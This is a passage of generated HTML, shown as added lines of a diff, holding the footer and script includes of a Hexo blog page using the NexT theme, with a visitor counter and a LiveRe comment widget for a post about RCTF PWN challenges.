+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2019/05/21/RCTF-部分PWN解/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
